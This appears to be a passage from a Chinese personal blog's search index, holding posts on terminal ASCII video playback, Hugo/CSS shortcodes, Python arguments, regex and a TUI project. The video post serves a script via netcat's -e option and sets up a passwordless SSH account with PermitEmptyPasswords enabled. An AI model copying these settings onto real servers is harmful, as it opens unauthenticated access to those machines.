\u0026#34;$img\u0026#34; --fill --chars=\u0026#34; ░\u0026#34; --output=\u0026#34;txt/frame_$(printf \u0026#39;%04d\u0026#39; $counter).txt\u0026#34;; 4 counter=$((counter + 1)); 5done 这些命令将 pic/ 目录下的 frame_.png 图像转化成 txt/ 目录下的 frame_.txt 文本文件。\n参数 解释 --colors 使用真彩色 --color-deepth 色彩深度 --height 生成的图像高度 --fill 使用填充 --chars 使用的字符 --output 输出文件 --height 生成的图像高度是指这张 ASCII 图像的行数，只有当终端的行数大于等于这个数值时，这张 ASCII 图像才能被正确显示出来。在 Linux 操作系统中，使用 tput lines 或者 echo $LINES 命令可以查看当前终端的行数。\n--fill 是指填满行与行之间的空隙，实际上是给字符添加反色效果。在终端中，相邻两行字符之间有空隙，如果添加了反色 \\033[7m 则会将空隙填充。\n--chars 是指使用的字符。在这里我使用空格和“浅的阴影”（U+2591），这样两个字符在反色之后色块填充更饱满。\n最后生成的文件使用 ANSI 转义序列调控颜色，如果直接使用 cat 命令打开，会看到正常显示的图像；使用 vim 命令编辑则会看到转义字符。\n连续播放像素画 前面我知道了使用 cat 命令打开这些文件可以正常显示，那么我只需要依次 cat 这些图像就可以实现播放图像。\n1for txt in txt/frame_*.txt; do 2 echo -e \u0026#34;\\033[H\u0026#34;; 3 cat $txt; 4done 输出的 \\033[H 也是一个 ANSI 控制字符，用于将光标移动到终端的最开头。如果使用 clear 命令清空屏幕，则会出现屏幕频闪的效果，而将光标移动到终端开头则直接从上一帧图像上绘制，覆盖上一帧，避免屏幕频闪。\n挂到服务器上 我在这一步遇到了一些问题。我最初的想法是将播放“视频”的脚本使用 netcat 上。例如我将上面播放的脚本存储为 TerminalVideo.sh，随后执行命令 nc -zvlp 6666 -e TerminalVideo.sh，这样其他机器执行 nc -zv 219.217.199.108 6666 命令就可以播放视频了。但是这样做也有诸多问题：\nnc 一次只能建立一个连接，不能实现多用户同时连接 在脚本运行结束后，nc 连接会自动断开 我想先尝试解决第二个问题，我运行下面的命令尝试持久化 nc 连接：\n1while true; do 2 nc -zvlp 6666 -e TerminalVideo.sh 3done 但是这样又出现了新的问题，如果在脚本运行时，用户按下 ^C 强制退出，那么这条 nc 连接就会失效，服务端会持续报错 “Permission Denied”，客户端无法连接。\n于是我又把目光放到了 SSH 上。之前在远程控制一台在内网中的设备里我尝试使用免密码的 SCP 传输文件。但是出于安全考虑，我需要将接受文件的用户的 Shell 改为一个空的 Shell，于是有了下面这段代码：\n1void main() 2{ 3 while (true) {;} 4} 最后测试证明，这段代码编译出来的程序是可以被用作 Shell 的。于是我现在需要做的是，写一个能够自动播放“视频”的程序，随后将其设为一个用户的默认 Shell，而且这个用户不应该有密码，使任何连接到校园网的用户都可以连接。首先我将 txt/ 目录移动到了 /etc 目录下（最开始选择的是 /tmp 目录，但是很快被系统自动清理了），并且下面一段代码：\n1// 6666.cpp 2 3#include \u0026lt;fcntl.h\u0026gt; 4#include \u0026lt;sys/ioctl.h\u0026gt; 5#include \u0026lt;unistd.h\u0026gt; 6#include \u0026lt;iostream\u0026gt; 7#include \u0026lt;fstream\u0026gt; 8 9 10using namespace std; 11 12int get_lines() // 检测终端高度 13{ 14 struct winsize ws; 15 int fd, result; 16 if ((fd = open(\u0026#34;/dev/tty\u0026#34;, O_WRONLY)) \u0026lt; 0) return -1; 17 result = ioctl(fd, TIOCGWINSZ, \u0026amp;ws); 18 close(fd); 19 return result ? -1 : ws.ws_row; 20} 21 22int main() 23{ 24 int rows = get_lines(); 25 if (rows == -1) 26 { 27 cout \u0026lt;\u0026lt; endl; 28 cout \u0026lt;\u0026lt; \u0026#34;\\033[7;31mUnknown Error!\\033[0m\u0026#34; \u0026lt;\u0026lt; endl; 29 cout \u0026lt;\u0026lt; endl; 30 return -1; 31 } 32 33 else if (rows \u0026lt; 80) 34 { 35 cout \u0026lt;\u0026lt; endl; 36 cout \u0026lt;\u0026lt; \u0026#34;+---------------------------------------------------------------+\u0026#34; \u0026lt;\u0026lt; endl; 37 cout \u0026lt;\u0026lt; \u0026#34;| The minimum height of your terminal to play this video is \\033[7;31m80\\033[0m. |\u0026#34; \u0026lt;\u0026lt; endl; 38 cout \u0026lt;\u0026lt; \u0026#34;| Use \\033[7;33mtput lines\\033[0m to check your terminal height. |\u0026#34; \u0026lt;\u0026lt; endl; 39 cout \u0026lt;\u0026lt; \u0026#34;+---------------------------------------------------------------+\u0026#34; \u0026lt;\u0026lt; endl; 40 cout \u0026lt;\u0026lt; endl; 41 return -1; 42 } 43 44 for (int i = 1; i \u0026lt;= 1354; i++) 45 { 46 cout \u0026lt;\u0026lt; \u0026#34;\\033[H\u0026#34;; 47 char filename[24]; 48 sprintf(filename, \u0026#34;/etc/txt/frame_%04d.txt\u0026#34;, i); 49 50 fstream file; 51 file.open(filename, ios::in); 52 string line; 53 while (getline(file, line)) 54 { 55 cout \u0026lt;\u0026lt; line \u0026lt;\u0026lt; endl; 56 } 57 } 58 return 0; 59} 多种编程语言都对 ANSI 控制有支持，C++ 也不例外，因此我直接 cout 控制字符，控制字符就能正确执行其功能。\n下一步就是建立一个无需密码就可以登录的用户，并将其默认 Shell 设为我们刚刚写的程序。需要执行以下命令：\n1sudo adduser mickey 2sudo passwd -d mickey 随后修改 /etc/ssh/sshd_config 文件，修改其中配置 PermitEmptyPasswords yes，随后重启 SSH 服务 sudo systemctl restart sshd 使修改生效。\n下一步使用命令 sudo chsh -s /bin/6666 mickey 修改默认 Shell。\n现在来看，功能已经大体实现。但是还有一个问题，在连接上的时候，服务器会输出 MOTD（Message of the Day），然而这些信息不应该对任何人可见，因此在 mickey 用户的家目录下创建 .hushlogin 文件 sudo touch /home/mickey/.hushlogin 以禁用 MOTD。\n最终效果如下：\n（没有声音）\n","link":"https://jackgdn.github.io/post/%E7%BB%88%E7%AB%AF%E6%92%AD%E6%94%BE%E8%A7%86%E9%A2%91/","section":"post","tags":["Linux","C++"],"title":"终端播放视频"},{"body":"","link":"https://jackgdn.github.io/tags/%E6%97%A5%E5%BF%97/","section":"tags","tags":null,"title":"日志"},{"body":"","link":"https://jackgdn.github.io/categories/%E6%97%A5%E5%BF%97/","section":"categories","tags":null,"title":"日志"},{"body":"我又给 \u0026lt;a\u0026gt; 标签加了一个酷酷的 hover 效果，有下面两种 \u0026lt;a\u0026gt; 标签使用了 hover 效果：\n没有 class 和 title 属性 class 属性中有 nav_item 但没有 nav_brand 我把自定义的效果写成 SASS 格式并写到主题给的 _custom.sass 文件里。\n1a 2 \u0026amp;:not([class]):not([title]) 3 position: relative 4 \u0026amp;:after 5 content: \u0026#39;\u0026#39; 6 position: absolute 7 left: 0 8 bottom: -5px 9 display: inline-block 10 height: 1px 11 background-color: #0077b8 12 width: 0 13 opacity: 0 14 transition: opacity 0.35s, width 0.35s 15 \u0026amp;:hover:after 16 opacity: 1 17 width: 100% 18 \u0026amp;.nav_item:not(.nav_brand) 19 position: relative 20 \u0026amp;:after 21 content: \u0026#39;\u0026#39; 22 position: absolute 23 left: 0 24 bottom: -5px 25 display: inline-block 26 height: 1px 27 background-color: #0077b8 28 width: 0 29 opacity: 0 30 transition: opacity 0.35s, width 0.35s 31 \u0026amp;:hover:after 32 opacity: 1 33 width: 100% 代码块标上 SASS 会导致渲染出错，故标成 CSS。\n同时我给其他博客的链接创建了卡片，也是使用 shortcode：\n1{{/* friend.html */}} 2 3\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css\u0026#34;\u0026gt; 4 5{{ $link := .Get \u0026#34;link\u0026#34; }} 6{{ $img := .Get \u0026#34;img\u0026#34; }} 7{{ $txt := .Get \u0026#34;txt\u0026#34; }} 8 9\u0026lt;div class=\u0026#34;friend-link-card\u0026#34;\u0026gt; 10 \u0026lt;div class=\u0026#34;friend-content\u0026#34;\u0026gt; 11 \u0026lt;div class=\u0026#34;friend-imgBx\u0026#34;\u0026gt; 12 \u0026lt;img src=\u0026#34;{{ $img }}\u0026#34;\u0026gt; 13 \u0026lt;/div\u0026gt; 14 \u0026lt;div class=\u0026#34;friend-text-content\u0026#34;\u0026gt; 15 \u0026lt;a href=\u0026#34;{{ $link }}\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener noreferrer\u0026#34;\u0026gt;{{ $txt }}\u0026lt;/a\u0026gt; 16 \u0026lt;/div\u0026gt; 17 \u0026lt;/div\u0026gt; 18\u0026lt;/div\u0026gt; 19 20\u0026lt;style\u0026gt; 21 .friend-link-card * { 22 margin: 0; 23 padding: 0; 24 box-sizing: border-box; 25 } 26 27 .friend-link-card { 28 padding: 0.5rem 1rem; 29 width: 25%; 30 outline: none; 31 color: var(--text); 32 background: var(--post-bg); 33 border: 1px solid var(--border); 34 border-radius: 8px; 35 font-size: 1rem; 36 box-shadow: 0 0.25rem 1rem rgba(0, 0, 0, 0.1); 37 margin-top: 10px; 38 min-width: 300px; 39 } 40 41 .friend-content { 42 display: flex; 43 align-items: center; 44 } 45 46 .friend-imgBx { 47 position: relative; 48 margin-right: 40px; 49 padding: 10px 0; 50 } 51 52 .friend-imgBx img { 53 width: 80px; 54 height: 80px; 55 border-radius: 50%; 56 display: block; 57 } 58 59 .friend-text-content { 60 flex: 1; 61 position: relative; 62 } 63 64 .friend-text-content a:after { 65 content: \u0026#39;\u0026#39;; 66 position: absolute; 67 left: 0; 68 bottom: -5px; 69 display: inline-block; 70 height: 1px; 71 background-color: #0077b8; 72 width: 0; 73 opacity: 0; 74 transition: opacity 0.35s, width 0.35s; 75 } 76 77 .friend-text-content a:hover:after { 78 opacity: 1; 79 width: 100%; 80 } 81\u0026lt;/style\u0026gt; ","link":"https://jackgdn.github.io/post/log-2024-09-18/","section":"post","tags":["日志"],"title":"日志-2024-09-18"},{"body":"今天心情一般，分享两首歌，同时测试新的 shortcode。 Bury the Light - Victor Borba\rDevil Trigger - Ali Edwards\rshortcode 如下：\r1{{/* audio.html */}} 2 3\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css\u0026#34;\u0026gt; 4 5{{ $link := .Get \u0026#34;link\u0026#34; }} 6{{ $img := .Get \u0026#34;img\u0026#34; }} 7{{ $txt := .Get \u0026#34;txt\u0026#34; }} 8{{ $src := .Get \u0026#34;src\u0026#34; }} 9{{ $uniqueID := .Get \u0026#34;id\u0026#34; }} 10 11\u0026lt;div class=\u0026#34;player\u0026#34; id=\u0026#34;{{ $uniqueID }}\u0026#34;\u0026gt; 12 \u0026lt;div class=\u0026#34;imgBx\u0026#34;\u0026gt; 13 \u0026lt;img src=\u0026#34;{{ $img }}\u0026#34;\u0026gt; 14 \u0026lt;/div\u0026gt; 15 \u0026lt;div class=\u0026#34;text-content\u0026#34;\u0026gt; 16 \u0026lt;a href=\u0026#34;{{ $link }}\u0026#34; class=\u0026#34;button mt-1\u0026#34; target=\u0026#34;_blank\u0026#34; rel=\u0026#34;noopener noreferrer\u0026#34;\u0026gt;{{ $txt }}\u0026lt;/a\u0026gt; \u0026lt;!-- button 类在主题中定义 --\u0026gt; 17 \u0026lt;/div\u0026gt; 18 \u0026lt;audio class=\u0026#34;audio-player\u0026#34;\u0026gt; 19 \u0026lt;source src=\u0026#34;{{ $src }}\u0026#34; type=\u0026#34;audio/mpeg\u0026#34;\u0026gt; 20 \u0026lt;/audio\u0026gt; 21 \u0026lt;button class=\u0026#34;play-btn\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-play\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/button\u0026gt; 22\u0026lt;/div\u0026gt; 23 24\u0026lt;style\u0026gt; 25 .player * { 26 margin: 0; 27 padding: 0; 28 box-sizing: border-box; 29 } 30 31 .player { 32 width: 300px; 33 background-color: rgba(0, 119, 184, 0.15); 34 padding: 20px 14px 8px 14px; 35 border: none; 36 border-radius: 1.5rem; 37 box-shadow: rgba(0, 0, 0, 0.1) 0px 0.25rem 1rem; 38 position: relative; 39 text-align: center; 40 } 41 42 .imgBx img { 43 width: 100%; 44 height: auto; 45 border: solid; 46 border-radius: 1.5rem; 47 } 48 49 .text-content { 50 margin: 3px 0; 51 padding: 0.5rem 1.5rem; 52 53 } 54 55 .text-content a { 56 color: #ffffff; 57 58 font-size: 16px; 59 60 text-decoration: none; 61 } 62 63 .audio-player { 64 display: none; 65 } 66 67 .play-btn { 68 background: #0077b8; 69 border: none; 70 border-radius: 50%; 71 width: 50px; 72 height: 50px; 73 font-size: 24px; 74 cursor: pointer; 75 position: absolute; 76 top: 50%; 77 left: 50%; 78 transform: translate(-50%, -50%); 79 } 80 81 .play-btn:hover { 82 background: #003553; 83 } 84 85 .play-btn i { 86 color: #fff; 87 } 88\u0026lt;/style\u0026gt; 89 90\u0026lt;script\u0026gt; 91 (function () { 92 const playerId = \u0026#34;{{ $uniqueID }}\u0026#34;; 93 const audioPlayer = document.querySelector(`#${playerId} .audio-player`); 94 const playButton = document.querySelector(`#${playerId} .play-btn`); 95 playButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { 96 if (audioPlayer.paused) { 97 audioPlayer.play(); 98 playButton.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-pause\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026#39;; 99 } else { 100 audioPlayer.pause(); 101 playButton.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-play\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026#39;; 102 } 103 }); 104 audioPlayer.addEventListener(\u0026#39;ended\u0026#39;, () =\u0026gt; { 105 playButton.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-play\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026#39;; 106 }); 107 })(); 108\u0026lt;/script\u0026gt; 主题把 \u0026lt;a\u0026gt; 标签的样式写死了，导致我对 \u0026lt;a\u0026gt; 标签样式的编辑都是徒劳的，因此我不得不使用主题定义的 button 让链接看上去更自然。\n","link":"https://jackgdn.github.io/post/log-2024-09-16/","section":"post","tags":["日志"],"title":"日志-2024-09-16"},{"body":"必选参数 初学者必会的参数类型，也是 Python 函数参数传递最基础的方式。函数在定义中要求传入，调用时必须传入的参数就是必选参数。\n1def foo(aParam, bParam): 2 print(aParam, bParam) 3 4foo(114514, 1919810) 5 6# output: 114514 1919810 函数定义中要求传入两个参数，那么在调用时就必须传入两个参数，如果出入过多或者过少参数均会报错。\n1def foo(aParam, bParam): 2 print(aParam, bParam) 3 4foo(114514) 5 6\u0026#34;\u0026#34;\u0026#34; 7output: 8Traceback (most recent call last): 9 File \u0026#34;/home/jackgdn/python-script/test.py\u0026#34;, line 4, in \u0026lt;module\u0026gt; 10 foo(114514) 11TypeError: foo() missing 1 required positional argument: \u0026#39;bParam\u0026#39; 12\u0026#34;\u0026#34;\u0026#34; 传入过少参数\n1def foo(aParam, bParam): 2 print(aParam, bParam) 3 4foo(114514, 1919810, \u0026#34;Hello, World!\u0026#34;) 5 6\u0026#34;\u0026#34;\u0026#34; 7Traceback (most recent call last): 8 File \u0026#34;/home/jackgdn/python-script/test.py\u0026#34;, line 4, in \u0026lt;module\u0026gt; 9 foo(114514, 1919810, \u0026#34;Hello, world!\u0026#34;) 10TypeError: foo() takes 2 positional arguments but 3 were given 11\u0026#34;\u0026#34;\u0026#34; 传入过多参数\n默认参数 在定义函数时给出默认值的参数，被称为默认参数。如果在调用函数时传入了默认参数，则默认参数被覆盖为传入的值；若没有传入，则默认参数为默认值。\n1def foo(aParam, bParam=1919810): 2 print(aParam, bParam) 3 4foo(114514) 5 6# output: 114514 1919810 不传入参数，函数使用默认参数\n1def foo(aParam, bParam=1919810): 2 print(aParam, bParam) 3 4foo(114514, \u0026#34;Hello, world!\u0026#34;) 5 6# output: 114514 Hello, world! 重要\n当默认参数为可变对象时，该对象会在函数的多次调用之间公用。\n对于上面这个问题，我们不妨举一个例子：\n1def append_to(element, values=[]): 2 values.append(element) 3 return values 4 5print(append_to(10)) 6print(append_to(20)) 7 8# output: 9# [10] 10# [10, 20] 在这段代码中，values 作为默认参数，默认为一个空列表。当这一函数被多次调用时，上一次得到的函数结果被保留，导致下一次调用函数时，得到的不是我们想要的结果。\n如果想要修复这个 bug，可以将代码改写为下面的形式：\n1def append_to(element, values=None): 2 if values is None: 3 values = list() 4 values.append(element) 5 return values 6 7print(append_to(10)) 8print(append_to(20)) 9 10# output: 11# [10] 12# [20] 可变参数 可变参数在声明函数时一般写作 *args，可变参数的数量时可变的，可以是任意多个（包括 0 个）。可变参数中的所有参数都会存储到一个元组中。\n1def foo(param, *args): 2 print(param) 3 print(type(args)) 4 print(args) 5 6foo(114514, 1919810, \u0026#34;Hello, world!\u0026#34;) 7 8# output: 9# 114514r 10# \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; 11# (1919810, \u0026#39;Hello, world!\u0026#39;) 重要\n函数声明时，若可变参数的数量多于一个，程序会抛出 SyntaxError。\n这也很好理解。因为函数会将多个传入的参数存储到一个元组中（如果可变参数数量为 0，则存储到一个空元组中），如果一个函数定义了多个可变参数，则无法区分存入的多个参数应当存入哪一个可变参数\n关键字参数 关键字参数在声明函数中一般写作 **kwargs，在调用函数时，以键值对的格式传入参数，随后键值对会存储为字典格式。和可变参数一样，如果传入的关键字参数数量为 0，则字典为空字典。\n1def foo(param, *args, **kwargs): 2 print(type(param), type(args), type(kwargs)) 3 print(param) 4 print(args) 5 print(kwargs) 6 7foo(141892, 1919810, \u0026#34;Hello, world!\u0026#34;, name=\u0026#39;jack_gdn\u0026#39;, university=\u0026#39;NEFU\u0026#39;) 8 9\u0026#34;\u0026#34;\u0026#34; 10output: 11\u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; \u0026lt;class \u0026#39;dict\u0026#39;\u0026gt; 12141892 13(1919810, \u0026#39;Hello, world!\u0026#39;) 14{\u0026#39;name\u0026#39;: \u0026#39;jack_gdn\u0026#39;, \u0026#39;university\u0026#39;: \u0026#39;NEFU\u0026#39;} 15\u0026#34;\u0026#34;\u0026#34; ","link":"https://jackgdn.github.io/post/args-and-kwargs-in-python/","section":"post","tags":["Python"],"title":"Python 中函数的参数"},{"body":"","link":"https://jackgdn.github.io/tags/regex/","section":"tags","tags":null,"title":"RegEx"},{"body":"\r正则表达式的编写 交互式学习正则表达式：RegexOne 中文\n正则表达式练习：RegExr\n正则表达式文档：MDN Web Docs 正则表达式\n基础篇 标记\n说明 样例 直接匹配，输入什么匹配什么。 RegEx: abc\nMatch: abc\nMatch: xyzabcdef . 匹配任何单个字符。 RegEx: .a\nMatch: 123abc \\ 转义字符，用于匹配某个用于标记的原始字符。 RegEx: \\.\nMatch: Hi.\nMatch: 3.14 [] 匹配特定范围内的单个字符 RegEx: [abc]an\nMatch: banana\nMatch: abcan [-] 用简略的方式表示范围。例如 [2-6] 等价于 [23456] RegEx: [0-3][a-c]\nMatch: 1a​2b8y9z [^] 排除特定范围内的单个字符 RegEx: b[^e]r\nMatch: barber \\d 匹配 0-9 中的单个数字字符，相当于 [0-9] RegEx: \\da\nMatch: 01a2b34 \\D 匹配单个非数字字符，相当于 [^0-9] RegEx: \\D2\nMatch: 1aa2b34 \\s 匹配单个空白字符，相当于 [\\f\\n\\r\\t\\v\\u0020\\u00a0\\u1680\\u180e\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。\n其中，\\f​\\n​\\r​\\t​\\v 与 ASCII 字符集中相同记号的转义字符同义，\\uhhhh 为 Unicode 字符集对应字符的编号。 RegEx: \\s\nMatch: Hello, world! \\S 匹配单个非空白字符，相当于 [^\\f\\n\\r\\t\\v\\u0020\\u00a0\\u1680\\u180e\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。 RegEx: \\S\nMatch: H​e​l​l​o​,​ w​o​r​l​d​! \\w 匹配单个单字字符，等价于 [A-Za-z0-9_]。 RegEx: \\w\nMatch: 3.14 \\W 匹配单个非单字字符，等价于 [^A-Za-z0-9_] RegEx: \\W\nMatch: 3.14 \\b 表示单词边界，匹配一个单词的开始或结束，而不匹配任何实际字符。 RegEx: \\bword\\b\nMatch: word and sword \\B 表示非单词边界，匹配字母或数字中间的位置，而不匹配任何实际字符。 RegEx: \\d\\B\\w\\B\nMatch: 01AB\nMatch: A4A2-g74t + 用于匹配 1 个或更多前面的标记。 RegEx: a+b+\nMatch: aaabb * 用于匹配任意多个前面的标记，匹配的前面标记的数量可以为 0。 RegEx: a+b*c\nMatch: aaabbbccc\nMatch: aaaccc ? 用于匹配前一个标记出现 0 次或 1 次。 RegEx: apples?\nMatch: apple\nMatch: appless {} 用于匹配指定数量的前一个标记。 RegEx: \\d{2}\nMatch: Jan 14, 20​05 {,}\n用于匹配指定数量范围的前一个标记，, 后可以为空。当 , 后留空时，则标识匹配前一个标记的最小值。 RegEx: \\d{3,}\nMatch: Jan 14, 2005 ^ 放在标记前，用于匹配开头的字符。 RegEx: ^[Oo]n[Ee]\nMatch: One by onE $ 放在标记后，用于匹配末尾的字符。 RegEx: [Oo]n[Ee]$\nMatch: One by onE | 或，| 前后的条件满足一个即可匹配 RegEx: I love (dogs|cats)\\.\nMatch: I love dogs.\nMatch: I love cats. 进阶篇 捕获组 捕获组用 () 表示，括号中的内容为一组。在一个正则表达式中的捕获组，按照上括号 ( 的顺序进行编号，对于嵌套捕获组同样适用。例如在表达式 ((\\d+) plus )\\d+ 中，捕获组 ((\\d+) plus ) 的编号为 1，而 \\d+ 这一捕获组的编号为 2。\n在正则表达式中，\\ 后直接加一个数字 n 相当于“复制”了第 n 个捕获组，从而允许表达式匹配相同的内容。例如，对于表达式 (\\w{3}) plus \\1 就可以匹配 \u0026quot;one plus one\u0026quot;，\u0026quot;two plus two\u0026quot;，但是无法匹配 \u0026quot;one plus two\u0026quot;。\n如果不想让某个捕获组获得编号，可以在 ( 后加入 ?:，这样捕获组就会成为非捕获组，非捕获组不会获得编号。例如对于 \u0026quot;one plus one, two plus two\u0026quot; 这个字符串中除去 , 之外的内容，可以使用 ((\\w{3}) plus \\2) 匹配，也可以使用 (?:(\\w{3}) plus \\1) 匹配。\n零宽断言 零宽断言有四种，分别是零宽正向先行断言 (?=)（指定后缀）、零宽正向后行断言 (?\u0026lt;=)（指定前缀）、零宽负向先行断言 (?!)（指定后缀不是）、零宽负向后行断言 (?\u0026lt;!)（指定前缀不是）。其中，被指定为或不为前缀或后缀的内容放在零宽断言中下括号 ) 前，先行断言置于标记后，后行断言置于标记前，且零宽断言只用于限定而不参与匹配。\n例如我们想匹配 \u0026quot;hopefully seriously\u0026quot; 这两个单词中 \u0026quot;ly\u0026quot; 前的部分，即 \u0026quot;hopeful\u0026quot; 和 \u0026quot;serious\u0026quot;，就可以使用零宽正向先行断言匹配后缀为 \u0026quot;ly\u0026quot; 的内容，因此我们使用表达式 \\w+(?=ly) 进行匹配，并且 \u0026quot;ly\u0026quot; 并不会被匹配。如果我们想匹配 \u0026quot;Qty.: 100, Price: £150\u0026quot; 中数量 \u0026quot;Qty.\u0026quot; 对应的值，则可使用 (?\u0026lt;!£)\\d{3}\n懒惰匹配 正则表达式默认遵循“贪婪匹配”原则，即尽可能匹配多的字符。例如使用表达式 a\\w+c 匹配字符串 \u0026quot;abcabc\u0026quot; 时，会匹配整个字符串，而非单独某一段 \u0026quot;abc\u0026quot;。如果想让匹配尽量短，则可以使用 “懒惰匹配” 模式。懒惰匹配有如下几种模式：+?（出现至少一次，但是长度尽量短）、*?（出现任意次，但是长度尽量短）、??（至多出现一次，但是长度尽量短）、{,}?（出现指定次数，但是长度尽量短）。\n例如对于字符串 \u0026quot;abcabc\u0026quot;，若需要其匹配为两段 \u0026quot;abc\u0026quot;，则可以使用表达式 a\\w+?c。使用表达式 a\\w{2,7}?c 可以匹配到 \u0026quot;abbbbcabbcabc\u0026quot; 的 \u0026quot;abbbc\u0026quot; 和 \u0026quot;abbc\u0026quot;，而非将 \u0026quot;abbbcabbc\u0026quot; 作为一个整体匹配。\n另外需要注意的是，正则表达式从字符串的开头开始匹配，使用懒惰匹配只会改变匹配到的结尾的位置，而非开头的位置。例如使用 a\\w*?c 匹配字符串 \u0026quot;aaaccc\u0026quot; 会得到 \u0026quot;aaac\u0026quot; 而非 \u0026quot;ac\u0026quot;。\n标志位 到目前为止，本文中出现的所有正则表达式都未使用标志位，而前文中所有的表达式都是默认使用 /g 作为标志位得到的相应的结果。正则表达式中有如下常见标志位：g（global，全局匹配）、i（case intensitive，不区分大小写）、m（multiline，多行匹配）、s（single line，单行匹配）。\n对于上面的正则表达式 a\\w*?c，其完整的写法是 /a\\w*?c/g。例如在匹配 \u0026quot;jack_gdn JackGDN JGDN\u0026quot; 这几个单词时，一个完整的正则表达式是 /j.*?gdn/gi。s 标志位会将多行内容看作一行内容，并且去除 \\n 或 \\r\\n。m 标志位对于 ^ 和 $ 标记格外有用。例如对于一段文本：\n1jack_gdn 2JackGDN 3JGDN 如果使用 /^j.*?gdn/gi 匹配，则只会匹配到第一行的 \u0026quot;jack_gdn\u0026quot;，而如果使用 /^j.*?gdn/gim 匹配，则会将三行内容全部匹配上。\n测试正则表达式 匹配\r匹配结果:\r","link":"https://jackgdn.github.io/post/regex-pt-1/","section":"post","tags":["RegEx"],"title":"正则表达式学习记录（一）——正则表达式的编写"},{"body":" 文档教程 菜鸟教程\nPython 文档\nEsolang\nMarkdown 教程\n实用工具 CodePen\nCompiler Explorer\nConvertio - 文档转换器\nCyberChef\nDeepL 翻译\nDNS Leak Test\nDraw.io\nEasy 6502\nFactordb\nGit History\nHoLaTeX\nIT Tools\nMagic Data 5\nMermaid Live Editor\nPhotopea\nPYC 反编译\nPyinstxtractor WEB\nUnicode Steganography with 0-Width Characters\nVigenere Solver\n博客链接 部分正在维护\nRoATH\rchen04\rhexobd\rChr0n0s\rsfc9982\rlarissa\r","link":"https://jackgdn.github.io/links/","section":"","tags":null,"title":"链接"},{"body":"经过几天的工作，我将个人博客从 Hexo 迁移至 Hugo 基本完成了。在之前，我使用的是 Hexo-Theme-Async 主题。Hexo 和 Hugo 各有优缺点。Hexo 的优点是简单易上手，只需傻瓜式操作就可以快速搭建完一个美观的博客；Hugo 的优点则是生成速度快并且客制化程度高。\n首先就生成速度快来说，运行 hugo server 这条命令的直观感觉就是比 hexo g 与 hexo s 要快很多倍，并且 Hugo 的热重载模式要优于 Hexo。当我修改完一篇文章时，Hugo 可以直接把我修改的内容展示出来，而使用 Hexo 还要重新生成，再加上 Hexo 极慢的生成速度……Hugo 显然更胜一筹。\n这一主题支持多语言版本，我也借此机会学习与专业相关的英语词汇。 转移到 Hugo 上后，原先大气精美的归档页面和友链页面都消失了；交互式网站标题和图标，还有各种有趣的小组件也都不能再使用。取而代之的是一个更简洁、更商务的博客主题。 这后面一段时间，我还需要尽量翻译几篇博客，给博客加入密码和评论的插件。\n","link":"https://jackgdn.github.io/post/log-2024-08-06/","section":"post","tags":["日志"],"title":"日志-2024-08-06"},{"body":" 东北林业大学在读本科生，学习计算机科学与技术专业。\n","link":"https://jackgdn.github.io/about/","section":"","tags":null,"title":"关于我"},{"body":"项目情况 项目介绍 本项目为一个商品管理应用程序，主要功能是创建、编辑、存储商品信息，同时程序还支持图表视图浏览、密码保护、日志记录等功能。程序使用 Textual 模块创建 TUI（Text-based User Interface，基于文本的用户界面） 程序，用户使用 TUI 与程序交互。我们选择使用 TUI 的理由如下：\n相比于 GUI 程序，TUI 程序可以在没有图形化界面的计算机系统内运行，有较强可移植性；相比于 CLI 程序，TUI 程序更易于用户操作。 用户只需键盘作为输入设备即可与程序交互，若用户使用鼠标则可以获得更佳交互体验。 使用 TUI 作为程序界面的人少之又少，而用于创建 TUI 程序的模块 Textual 的资料更是稀缺。因此，制作 TUI 程序可以体现作者完成这一项目的过程即是学习的过程。 作者个人情怀 程序功能的详细介绍如下：\n权限异常提示。当用户以无读写文件权限的普通用户身份执行程序时，程序会通过 AlertModalScreen 类创建弹窗提醒用户权限不足。此外，为了确保数据安全，程序使用的数据文件、密码存储文件、日志文件的权限均设为 600。 登录模块。登录界面的会根据用户登录状态的不同而显示不同内容（登录界面的可复用性极强，下面三种不同状态下的登录界面都是基于 LoginModalScreen 类创建的）：用户首次登录时，由于没有可用账户，程序会提示用户创建新的账户；有可用账户时，程序会在运行时提示用户登录，登录成功后数据才会加载；用户登录成功后，可以修改密码，修改密码后下次登录使用旧密码则会登录失败。用户名和密码输入框都限制了无法输入空格。用户的用户名及密码使用 PBKDF2 与 SHA256 算法（通过 hashlib.pbkdf2_hmac() 函数实现）进行保护，并加入随机密码盐确保密码不会遭到彩虹表攻击。无论用户在何时注册或者修改密码，也无论用户使用何用户名密码，存储到 logininfo 密码文件中的数据几乎没有重复的可能性。 数据处理模块。这一部分是程序的核心部分。用户在登录后会自动加载已保存的数据并且以组件的形式显示在屏幕上。数据包含商品名称、商品单价、商品数量、商品分区以及商品编号，用户可以编辑每一个商品的相关信息或者删除这些信息。其中，商品名称一栏尽可填写大小写字母、数字以及空格；商品单价一栏仅可输入浮点类型或者整型数据，商品数量一栏仅可输入整型数据；商品分区为一个下拉菜单，其中有十种类别可以选择。编辑后的数据需要用户手动保存，数据存储为 TSV 格式。 日志模块。创建用户、登录、登录失败以及保存文件这四种操作及操作时间会被记录并存储到日志文件中。 以表格视图浏览数据。表格视图可以浏览用户实时编辑的数据而非从已保存的文件中读取数据。在表格视图中，用户可以以商品名称、商品单价、商品数量、商品分区以及商品编号为排序依据对数据进行排序。 切换亮/暗显示模式。 